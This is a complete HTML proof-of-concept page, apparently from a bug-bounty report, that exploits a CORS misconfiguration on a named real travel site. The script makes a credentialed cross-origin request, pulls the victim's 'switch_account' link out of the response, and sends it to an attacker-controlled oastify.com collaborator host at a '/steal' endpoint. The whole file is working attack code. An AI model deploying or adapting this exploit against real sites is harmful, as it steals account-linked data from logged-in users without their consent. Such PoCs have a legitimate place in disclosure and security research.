<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Link dengan CORS</title>
</head>
<body>
    <h1>POC - Ambil Link dengan CORS</h1>
    <script>
        fetch('https://nl.m.viator.com', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            var parser = new DOMParser();
            var doc = parser.parseFromString(data, 'text/html');
            var linkElement = doc.getElementById('switch_account');
            if (linkElement) {
                var linkHref = linkElement.href;
                // Kirim link ke server penyerang
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?link=" + encodeURIComponent(linkHref), true);
                xhr.send();
            } else {
                console.log("Element dengan id 'switch_account' tidak ditemukan.");
            }
        })
        .catch(error => console.log("Gagal mengambil link:", error));
    </script>
</body>
</html>
